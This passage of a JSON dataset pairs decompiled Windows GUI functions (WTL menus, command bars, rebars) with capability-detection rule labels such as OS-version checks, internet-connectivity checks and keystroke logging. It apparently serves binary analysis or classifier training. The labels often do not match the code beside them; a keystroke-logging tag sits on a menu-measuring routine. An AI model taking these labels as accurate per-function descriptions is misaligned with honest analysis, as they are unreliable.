 var_4ch = 0x32;\n                    _var_48h = 0;\n                    _uIDNewItem = 0;\n                    _var_38h = 0;\n                    _var_30h = 0;\n                    _var_28h = 0;\n                    (*_sym.imp.USER32.dll_GetMenuItemInfoW)(iVar4, iVar5, 1, &lpmii);\n                    if (var_30h != NULL) {\n                        var_8h = 0;\n                        _lpBuffer = ZEXT816(0);\n                        _var_10h = 0;\n                        (*_sym.imp.KERNEL32.dll_VirtualQuery)(var_30h, &lpBuffer, 0x1c);\n                        if (((lpBuffer != 0) && ((_var_10h & 0x600000000) != 0)) && (*var_30h == 0x1313)) {\n                            var_4ch = 0x31;\n                            _var_48h = *(var_30h + 2);\n                            _var_30h = _var_30h & 0xffffffff | var_30h[1] << 0x20;\n                            uVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(var_30h[1]);\n                            _var_28h = _var_28h & 0xffffffff00000000 | uVar7;\n                            _var_30h = _var_30h & 0xffffffff00000000;\n                            (*_sym.imp.USER32.dll_SetMenuItemInfoW)(iVar4, iVar5, 1, &lpmii);\n                            (*_sym.imp.USER32.dll_ModifyMenuW)\n                                      (iVar4, iVar5, var_44h | var_48h | 0x400, uIDNewItem, var_30h[1]);\n                            fcn.0042fb11(var_30h[1]);\n                            fcn.0042fafa(var_30h);\n                        }\n                    }\n                    iVar5 = iVar5 + 1;\n                    iVar6 = (*_sym.imp.USER32.dll_GetMenuItemCount)(iVar4);\n                    in_ECX = var_4h;\n                } while (iVar5 < iVar6);\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 1315
    },
    "00405cd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00405cd0(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x6cc7cc == 0) {\n        iVar1 = *0x6cc6dc + 0x10;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar1);\n        if (*0x6cc7cc == 0) {\n            *0x6cc7cc = (*_sym.imp.USER32.dll_RegisterWindowMessageW)(L\"WTL_CmdBar_InternalAutoPopupMsg\");\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar1);\n    }\n    return *0x6cc7cc;\n}\n",
        "token_count": 144
    },
    "00405d30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00405d30(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x6cc7c8 == 0) {\n        iVar1 = *0x6cc6dc + 0x10;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar1);\n        if (*0x6cc7c8 == 0) {\n            *0x6cc7c8 = (*_sym.imp.USER32.dll_RegisterWindowMessageW)(L\"WTL_CmdBar_InternalGetBarMsg\");\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar1);\n    }\n    return *0x6cc7c8;\n}\n",
        "token_count": 148
    },
    "004064e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004064e0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (-1 < *(param_1 + 0x84)) goto code_r0x00406526;\n    if ((*(param_1 + 0x58) & 4) == 0) {\ncode_r0x00406510:\n        iVar1 = (*_sym.imp.USER32.dll_IsWindow)(*(param_1 + 0x5c));\n        if (iVar1 == 0) goto code_r0x00406526;\n        uVar2 = *(param_1 + 0x5c);\n    }\n    else {\n        iVar1 = (*_sym.imp.USER32.dll_IsWindow)(*(param_1 + 0xac));\n        if (iVar1 == 0) {\n            if ((*(param_1 + 0x58) & 4) != 0) goto code_r0x00406526;\n            goto code_r0x00406510;\n        }\n        uVar2 = *(param_1 + 0xac);\n    }\n    (*_sym.imp.USER32.dll_SetFocus)(uVar2);\ncode_r0x00406526:\n    *(param_1 + 0xac) = 0;\n    (*_sym.imp.USER32.dll_SendMessageW)(*(param_1 + 4), 0x449, 0, 0);\n    if ((*(param_1 + 0x85) & 6) == 6) {\n        fcn.0040d5b0(0);\n    }\n    *(param_1 + 0x85) = *(param_1 + 0x85) & 0x7f;\n    return;\n}\n",
        "token_count": 380
    },
    "00406560": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.00406560(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    if (*0x6c9d28 == 0xffffffff) {\n        iVar2 = *0x6cc6dc + 0x10;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar2);\n        if (*0x6c9d28 == 0xffffffff) {\n            cVar1 = fcn.004066f0(6, 0, 0);\n            *0x6c9d28 = cVar1 != '\\0';\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar2);\n    }\n    return *0x6c9d28 & 0xffffff00 | *0x6c9d28 == 1;\n}\n",
        "token_count": 178
    },
    "00406690": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.00406690(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*0x6c9d24 == 0xffffffff) {\n        iVar2 = *0x6cc6dc + 0x10;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar2);\n        if (*0x6c9d24 == 0xffffffff) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"uxtheme.dll\");\n            *0x6c9d24 = iVar1 != 0;\n            if (iVar1 != 0) {\n                (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar1);\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar2);\n    }\n    return *0x6c9d24 & 0xffffff00 | *0x6c9d24 == 1;\n}\n",
        "token_count": 206
    },
    "004067f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004067f0(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint uVar6;\n    \n    piVar1 = arg_10h;\n    if ((arg_8h == 0) && (arg_ch == 1)) {\n        iVar4 = arg_10h[1];\n        iVar2 = fcn.00405d30();\n        if ((iVar4 != iVar2) && (iVar4 != 0x37f)) {\n            iVar4 = *piVar1;\n            arg_10h = NULL;\n            do {\n                if (iVar4 == 0) goto code_r0x004068ca;\n                if (*0x6cc7c8 == 0) {\n                    iVar2 = *0x6cc6dc + 0x10;\n                    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar2);\n                    if (*0x6cc7c8 == 0) {\n                        *0x6cc7c8 = (*_sym.imp.USER32.dll_RegisterWindowMessageW)(L\"WTL_CmdBar_InternalGetBarMsg\");\n                    }\n                    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar2);\n                }\n                puVar3 = (*_sym.imp.USER32.dll_SendMessageW)(iVar4, *0x6cc7c8, &arg_10h, 0);\n                iVar4 = (*_sym.imp.USER32.dll_GetParent)(iVar4);\n            } while (puVar3 == NULL);\n            piVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n            if (arg_10h == piVar5) {\n                puVar3[7] = *piVar1;\n                iVar4 = (*_sym.imp.USER32.dll_IsWindow)(*puVar3);\n                if (iVar4 != 0) {\n                    (*_sym.imp.USER32.dll_SendMessageW)(*puVar3, 0x37f, 0, piVar1);\n                }\n            }\n        }\n    }\ncode_r0x004068ca:\n    iVar4 = arg_ch;\n    if (*0x6cc7b4 != 0) {\n        arg_ch = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        puVar3 = fcn.004067a0(&arg_ch);\n        if (puVar3 != NULL) {\n            uVar6 = (*_sym.imp.USER32.dll_CallNextHookEx)(*puVar3, arg_8h, iVar4, piVar1);\n            return uVar6;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 601
    },
    "00406e20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00406e20(uint noname_0, uint *arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint *puVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    uint uVar8;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint pt;\n    uint *var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t hMenu;\n    uint *var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint lptpm;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint lprc;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_38h = arg_ch;\n    hMenu = 0;\n    var_34h._0_1_ = '\\0';\n    var_44h = in_ECX;\n    cVar4 = fcn.004099e0(&hMenu);\n    puVar3 = var_38h;\n    if (cVar4 == '\\0') {\n        *arg_10h = 0;\n        fcn.004303e9(unaff_EBX);\n        return;\n    }\n    uVar8 = *var_38h;\n    var_30h = var_38h[6];\n    var_2ch = var_38h[9];\n    (*_sym.imp.USER32.dll_MapWindowPoints)(uVar8, 0, &var_30h, 1);\n    lprc = puVar3[6];\n    uStack20 = puVar3[7];\n    uStack16 = puVar3[8];\n    uStack12 = puVar3[9];\n    (*_sym.imp.USER32.dll_MapWindowPoints)(uVar8, 0, &lprc, 2);\n    pcVar2 = _sym.imp.USER32.dll_SendMessageW;\n    lptpm = 0x14;\n    var_24h = lprc;\n    uStack36 = uStack20;\n    uStack32 = uStack16;\n    uStack28 = uStack12;\n    var_40h = (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 4), 0x52d, 0, 0);\n    iVar5 = (*_sym.imp.USER32.dll_IsWindow)(var_40h);\n    uVar8 = var_2ch;\n    iVar7 = hMenu;\n    if (iVar5 == 0) {\n        uVar1 = *(in_ECX + 4);\n        uVar6 = fcn.0040edc0(var_30h, var_2ch);\n        iVar7 = hMenu;\n        (*_sym.imp.USER32.dll_TrackPopupMenuEx)(hMenu, 0x1040, uVar6, uVar8, uVar1, &lptpm);\n    }\n    else {\n        _var_50h = CONCAT44(var_2ch, var_30h);\n        var_48h = &lptpm;\n        _var_60h = CONCAT412(0x1040, CONCAT48(hMenu, CONCAT44(0x18, var_60h)));\n        (*pcVar2)(var_40h, 0x52f, 0, &var_5ch);\n    }\n    if (var_34h != '\\0') {\n        iVar5 = (*_sym.imp.USER32.dll_GetMenuItemCount)(iVar7);\n        pcVar2 = _sym.imp.USER32.dll_RemoveMenu;\n        while (iVar5 = iVar5 + -1,  -1 < iVar5) {\n            (*pcVar2)(iVar7, iVar5, 0x400);\n            in_ECX = var_44h;\n        }\n    }\n    if (iVar7 != 0) {\n        (*_sym.imp.USER32.dll_DestroyMenu)(iVar7);\n    }\n    lprc = var_38h[6];\n    uStack20 = var_38h[7];\n    uStack16 = var_38h[8];\n    uStack12 = var_38h[9];\n    (*_sym.imp.USER32.dll_MapWindowPoints)(*var_38h, 0, &lprc, 2);\n    pcVar2 = _sym.imp.USER32.dll_PeekMessageW;\n    uVar8 = 0x201;\n    var_48h = NULL;\n    _var_60h = ZEXT816(0);\n    _var_50h = 0;\n    iVar7 = (*_sym.imp.USER32.dll_PeekMessageW)(&var_60h, *(in_ECX + 4), 0x201, 0x201, 0);\n    if (iVar7 != 0) {\n        iVar7 = (*_sym.imp.USER32.dll_PtInRect)(&lprc, pt, var_48h);\n        if (iVar7 != 0) {\n            (*pcVar2)(&var_60h, *(in_ECX + 4), 0x201, 0x201, 1);\n        }\n    }\n    fcn.004303e9(uVar8);\n    return;\n}\n",
        "token_count": 1253
    },
    "004071c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004071c0(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint uVar5;\n    char cVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uint *puVar13;\n    uint *puVar14;\n    uint var_27ch;\n    uint var_278h;\n    uint var_270h;\n    int32_t var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint32_t var_260h;\n    int32_t var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint lpszText;\n    uint var_c0h;\n    int32_t var_60h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_25ch = *(param_1 + 4);\n    iVar11 = param_1 + 0xac;\n    iVar7 = fcn.00406450();\n    if (*(iVar7 + 0x30) == 0) {\n        iVar7 = fcn.00406450();\n        *(iVar7 + 0x30) = L\"ToolbarWindow32\";\n    }\n    uVar8 = fcn.00406450();\n    uVar9 = fcn.004014b0(0x6cc7dc, 0x6c9c5c, uVar8, param_1 + 0xec);\n    uVar9 = uVar9 & 0xffff;\n    iVar7 = *(param_1 + 0xe0);\n    var_260h = uVar9;\n    if (iVar7 != 0) {\ncode_r0x0040724b:\n        fcn.0042f850(iVar7, 0, 0);\n        if (uVar9 == 0) {\n            uVar8 = 0;\n            goto code_r0x004072eb;\n        }\n        piVar1 = param_1 + 0xd4;\n        if ((piVar1 != NULL) && (iVar11 != 0)) {\n            *piVar1 = iVar11;\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            *(param_1 + 0xd8) = uVar8;\n            (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x6c9c60);\n            *(param_1 + 0xdc) = *0x6c9c78;\n            *0x6c9c78 = piVar1;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x6c9c60);\n            uVar8 = (*_sym.imp.USER32.dll_CreateWindowExW)\n                              (0, var_260h & 0xffff, 0, 0x5600184c, *0x6c9c88, *0x6c9c8c, *0x6c9c90 - *0x6c9c88, \n                               *0x6c9c94 - *0x6c9c8c, var_25ch, iVar11, *0x6cc7e0, 0);\n            goto code_r0x004072eb;\n        }\n        fcn.0040eda0(0xc0000005, 1);\ncode_r0x004076f7:\n        fcn.00402f30(0x80004005);\ncode_r0x00407701:\n        fcn.00402f30(0x80004005);\n        goto code_r0x0040770b;\n    }\n    iVar7 = fcn.0042f74e();\n    *(param_1 + 0xe0) = iVar7;\n    if (iVar7 != 0) goto code_r0x0040724b;\n    (*_sym.imp.KERNEL32.dll_SetLastError)(0xe);\n    uVar8 = 0;\ncode_r0x004072eb:\n    uVar10 = (*_sym.imp.USER32.dll_GetMenu)(*(param_1 + 4));\n    fcn.00402f70(uVar10);\n    fcn.0040ee40(0x80, 0, 0, 0, 0);\n    (*_sym.imp.USER32.dll_SetMenu)(*(param_1 + 4), 0);\n    var_25ch = fcn.00403920(*(param_1 + 4), 0x80, 0, 0x5600094c, 0xe800);\n    iVar11 = (*_sym.imp.USER32.dll_CreateWindowExW)\n                       (0, L\"ReBarWindow32\", 0, 0x56002648, 0, 0, 100, 100, *(param_1 + 4), 0xe800, *0x6cc7e0, 0);\n    if (iVar11 == 0) {\ncode_r0x004073a4:\n        iVar11 = 0;\n    }\n    else {\n        var_27ch = 0xc;\n        _var_278h = 0;\n        iVar7 = (*_sym.imp.USER32.dll_SendMessageW)(iVar11, 0x404, 0, &var_27ch);\n        if (iVar7 == 0) {\n            (*_sym.imp.USER32.dll_DestroyWindow)(iVar11);\n            goto code_r0x004073a4;\n        }\n    }\n    *(param_1 + 0x24) = iVar11;\n    fcn.00402470(iVar11, uVar8, 0, 0, 0, 0, 0);\n    fcn.00402470(*(param_1 + 0x24), var_25ch, 0, 0, 1, 0, 0);\n    lpszText._0_2_ = 0;\n    (*_sym.imp.USER32.dll_LoadStringW)(*0x6cc7e4, 0xe001, &lpszText, 0x80);\n    uVar10 = (*_sym.imp.COMCTL32.dll_CreateStatusWindowW)(0x56000008, &lpszText, *(param_1 + 4), 0xe801);\n    uVar8 = *(param_1 + 4);\n    *(param_1 + 0x28) = uVar10;\n    uVar9 = fcn.004014b0(0x6cc7dc, 0x6c9c5c, 0x6c9d30, param_1 + 0xa8);\n    uVar10 = 0;\n    uVar8 = fcn.00403550(uVar8, 0x6c9c88, 0, 0x56000000, 0x200, 0, uVar9 & 0xffff, 0);\n    iVar11 = var_25ch;\n    *(param_1 + 0x2c) = uVar8;\n    if (var_25ch != 0) {\n        iVar7 = *(param_1 + 0x78);\n        var_26ch = CONCAT22(var_26ch._2_2_, 8);\n        if (*(param_1 + 0x74) == iVar7) {\n            puVar13 = *(param_1 + 0x70);\n            if ((puVar13 <= &var_270h) && (&var_270h < puVar13 + iVar7 * 2)) goto code_r0x004076f7;\n            if (iVar7 == 0) {\n                uVar9 = 1;\n            }\n            else {\n                uVar9 = *(param_1 + 0x74) * 2;\n                if ((uVar9 < 0) || (0xfffffff < uVar9)) goto code_r0x004074f5;\n            }\n            iVar7 = fcn.0043bd7a(puVar13, uVar9, 8);\n            if (iVar7 == 0) goto code_r0x004074f5;\n            *(param_1 + 0x78) = uVar9;\n            *(param_1 + 0x70) = iVar7;\n        }\n        piVar1 = *(param_1 + 0x70) + *(param_1 + 0x74) * 8;\n        if (piVar1 != NULL) {\n            *piVar1 = iVar11;\n            piVar1[1] = var_26ch;\n        }\n        *(param_1 + 0x74) = *(param_1 + 0x74) + 1;\n    }\ncode_r0x004074f5:\n    fcn.0040db10(0xe800, 1, 0);\n    fcn.0040db10(0xe801, 1, 0);\n    uVar5 = *0x47bfbc;\n    uVar4 = *0x47bfb8;\n    uVar8 = *0x47bfb4;\n    *(param_1 + 0x58) = *0x47bfb0;\n    *(param_1 + 0x5c) = uVar8;\n    *(param_1 + 0x60) = uVar4;\n    *(param_1 + 100) = uVar5;\n    iVar11 = param_1;\n    if (param_1 == -0x34) {\n        iVar11 = 0;\n    }\n    iVar7 = (*_sym.imp.USER32.dll_IsWindow)(*(iVar11 + 4));\n    if (iVar7 != 0) {\n        cVar6 = fcn.00406560();\n        if (cVar6 != '\\0') {\n            (*_sym.imp.dwmapi.dll_DwmExtendFrameIntoClientArea)(*(iVar11 + 4), param_1 + 0x58);\n        }\n    }\n    fcn.00431db0(&var_60h, 0, 0x5c);\n    if (*(param_1 + 0x4c) == 0) {\n        var_258h = 0x1f8;\n        fcn.00431db0(&var_254h, 0, 500);\n        (*_sym.imp.USER32.dll_SystemParametersInfoW)(0x29, 0x1f8, &var_258h, 0);\n        puVar13 = &var_c0h;\n        puVar14 = &var_60h;\n        for (iVar11 = 0x17; iVar11 != 0; iVar11 = iVar11 + -1) {\n            *puVar14 = *puVar13;\n            puVar13 = puVar13 + 1;\n            puVar14 = puVar14 + 1;\n        }\n    }\n    else {\n        (*_sym.imp.UxTheme.dll_GetThemeSysFont)(*(param_1 + 0x4c), 0x325, &var_60h);\n    }\n    var_60h = var_60h * 3;\n    uVar8 = (*_sym.imp.GDI32.dll_CreateFontIndirectW)(&var_60h);\n    *(param_1 + 0x16c) = uVar8;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    iVar12 = fcn.00405e10(uVar8);\n    var_260h = -(param_1 != 0) & param_1 + 0x68U;\n    iVar11 = *(iVar12 + 8);\n    iVar7 = *(iVar12 + 0xc);\n    if (iVar11 == iVar7) {\n        puVar13 = *(iVar12 + 4);\n        if (puVar13 <= &var_264h) {\n            if (&var_264h < puVar13 + iVar7) goto code_r0x00407701;\n            iVar11 = *(iVar12 + 8);\n        }\n        if (iVar7 == 0) {\n            uVar9 = 1;\ncode_r0x0040763b:\n            iVar11 = fcn.0043bd7a(puVar13, uVar9, 4);\n            if (iVar11 != 0) {\n                *(iVar12 + 0xc) = uVar9;\n                *(iVar12 + 4) = iVar11;\n                goto code_r0x00407657;\n            }\n        }\n        else {\n            uVar9 = iVar11 * 2;\n            if ((-1 < uVar9) && (uVar9 < 0x20000000)) goto code_r0x0040763b;\n        }\n    }\n    else {\ncode_r0x00407657:\n        puVar2 = *(iVar12 + 4) + *(iVar12 + 8) * 4;\n        if (puVar2 != NULL) {\n            *puVar2 = var_260h;\n        }\n        *(iVar12 + 8) = *(iVar12 + 8) + 1;\n    }\n    iVar11 = *(iVar12 + 0x14);\n    iVar7 = *(iVar12 + 0x18);\n    if (iVar11 == iVar7) {\n        puVar13 = *(iVar12 + 0x10);\n        if ((puVar13 <= &var_268h) && (iVar11 = *(iVar12 + 0x14),  &var_268h < puVar13 + iVar7)) {\ncode_r0x0040770b:\n            fcn.00402f30(0x80004005);\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        if (iVar7 == 0) {\n            uVar9 = 1;\n        }\n        else {\n            uVar9 = iVar11 * 2;\n            if ((uVar9 < 0) || (0x1fffffff < uVar9)) goto code_r0x004076d6;\n        }\n        iVar11 = fcn.0043bd7a(puVar13, uVar9, 4);\n        if (iVar11 == 0) goto code_r0x004076d6;\n        *(iVar12 + 0x18) = uVar9;\n        *(iVar12 + 0x10) = iVar11;\n    }\n    puVar2 = *(iVar12 + 0x10) + *(iVar12 + 0x14) * 4;\n    if (puVar2 != NULL) {\n        *puVar2 = -(param_1 != 0) & param_1 + 0x6cU;\n    }\n    *(iVar12 + 0x14) = *(iVar12 + 0x14) + 1;\ncode_r0x004076d6:\n    fcn.004303e9(uVar10);\n    return;\n}\n",
        "token_count": 3290
    },
    "00408670": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: hdc\n\nvoid __cdecl fcn.00408670(uint noname_0, uint noname_1, int32_t *arg_10h, uint *arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint hdc;\n    uint hgdiobj;\n    uint var_e0h;\n    uint var_dch;\n    int32_t var_d8h;\n    uint lpvObject;\n    int32_t var_6ch;\n    int32_t lpBuffer;\n    ulong uStack32;\n    int32_t lprc;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    piVar1 = arg_10h[5];\n    if ((*arg_10h == 1) && (piVar1 != NULL)) {\n        var_8h = 0;\n        lpBuffer = SUB164(ZEXT816(0), 0);\n        uStack32 = SUB168(ZEXT816(0) >> 0x20, 0);\n        lprc = 0;\n        var_10h = 0;\n        var_ch = 0;\n        (*_sym.imp.KERNEL32.dll_VirtualQuery)(piVar1, &lpBuffer, 0x1c);\n        if ((lpBuffer != 0) && (((var_ch & 6) != 0 && (*piVar1 == 0x1313)))) {\n            iVar2 = arg_10h[5];\n            if ((*(iVar2 + 8) & 0x800) == 0) {\n                hdc = (*_sym.imp.USER32.dll_GetWindowDC)(0);\n                iVar6 = 0;\n                if ((*(iVar2 + 0xc) & 0x1000) == 0) {\n                    iVar7 = *(in_ECX + 0xa4);\n                }\n                else {\n                    fcn.00431db0(&lpvObject, 0, 0x5c);\n                    (*_sym.imp.GDI32.dll_GetObjectW)(*(in_ECX + 0xa4), 0x5c, &lpvObject);\n                    var_6ch = var_6ch + 200;\n                    iVar6 = (*_sym.imp.GDI32.dll_CreateFontIndirectW)(&lpvObject);\n                    iVar7 = iVar6;\n                }\n                uVar3 = (*_sym.imp.GDI32.dll_SelectObject)(hdc, iVar7);\n                lprc = SUB164(ZEXT816(0), 0);\n                var_10h = SUB164(ZEXT816(0) >> 0x20, 0);\n                var_ch = 0;\n                var_8h = 0;\n                (*_sym.imp.USER32.dll_DrawTextW)(hdc, *(iVar2 + 4), 0xffffffff, &lprc, 0x424);\n                iVar7 = var_ch - lprc;\n                (*_sym.imp.GDI32.dll_SelectObject)(hdc, uVar3);\n                fcn.00431db0(&var_d8h, 0, 0x5c);\n                (*_sym.imp.GDI32.dll_GetObjectW)(*(in_ECX + 0xa4), 0x5c, &var_d8h);\n                iVar2 = -var_d8h;\n                if (-1 < var_d8h) {\n                    iVar2 = var_d8h;\n                }\n                iVar5 = iVar2 + 8;\n                if (iVar2 + 8 <= *(in_ECX + 0x9c)) {\n                    iVar5 = *(in_ECX + 0x9c);\n                }\n                arg_10h[4] = iVar5;\n                iVar2 = *(in_ECX + 0x98);\n                iVar5 = *(in_ECX + 0xb0);\n                iVar4 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x47);\n                arg_10h[3] = ((iVar7 + iVar5 + iVar2 * 2) - iVar4) + 6;\n                if (iVar6 != 0) {\n                    (*_sym.imp.GDI32.dll_DeleteObject)(iVar6);\n                }\n                (*_sym.imp.USER32.dll_ReleaseDC)(0, hdc);\n            }\n            else {\n                iVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0xf);\n                arg_10h[3] = 0;\n                arg_10h[4] = iVar2 / 2;\n            }\n            goto code_r0x0040885c;\n        }\n    }\n    *arg_14h = 0;\ncode_r0x0040885c:\n    fcn.004303e9(hdc);\n    return;\n}\n",
        "token_count": 1101
    },
    "00408cc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00408cc0(uint Msg, uint32_t arg_ch, int32_t arg_10h, uint *arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    code *pcVar6;\n    int32_t iVar7;\n    uint lpmii;\n    uint var_4ch;\n    uint var_48h;\n    uint var_40h;\n    uint var_38h;\n    int32_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t lpBuffer;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    uVar1 = *(in_ECX + 0x84);\n    if ((uVar1 & 2) == 0) {\n        if (((arg_10h == 0) || (arg_10h == *(in_ECX + 0x44))) || ((arg_ch >> 0x10 & 0x10) == 0)) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = 8;\n        }\n        *(in_ECX + 0x84) = uVar1 & 0xf7 | uVar3;\n        iVar4 = (*_sym.imp.USER32.dll_IsWindow)(*(in_ECX + 0x5c));\n        if (iVar4 != 0) {\n            (*_sym.imp.USER32.dll_SendMessageW)(*(in_ECX + 0x5c), Msg, arg_ch, arg_10h);\n        }\n    }\n    else if (((arg_ch >> 0x10 == 0xffff) && (arg_10h == 0)) &&\n            (pcVar6 = _sym.imp.USER32.dll_GetMenuItemCount,  var_4h = in_ECX,  (uVar1 & 4) != 0)) {\n        while( true ) {\n            iVar4 = *(var_4h + 0x18) + -1;\n            if (((iVar4 < 0) || (iVar2 = *(*(var_4h + 0x14) + iVar4 * 4),  *(var_4h + 0x18) <= iVar4)) ||\n               (*(var_4h + 0x18) = iVar4,  iVar2 == 0)) break;\n            iVar7 = 0;\n            iVar4 = (*pcVar6)(iVar2);\n            if (0 < iVar4) {\n                do {\n                    lpmii = 0x30;\n                    var_4ch = 0x30;\n                    _var_48h = 0;\n                    _var_40h = 0;\n                    _var_38h = 0;\n                    _var_30h = 0;\n                    _var_28h = 0;\n                    (*_sym.imp.USER32.dll_GetMenuItemInfoW)(iVar2, iVar7, 1, &lpmii);\n                    if (var_30h != NULL) {\n                        var_8h = 0;\n                        _lpBuffer = ZEXT816(0);\n                        _var_10h = 0;\n                        (*_sym.imp.KERNEL32.dll_VirtualQuery)(var_30h, &lpBuffer, 0x1c);\n                        if (((lpBuffer != 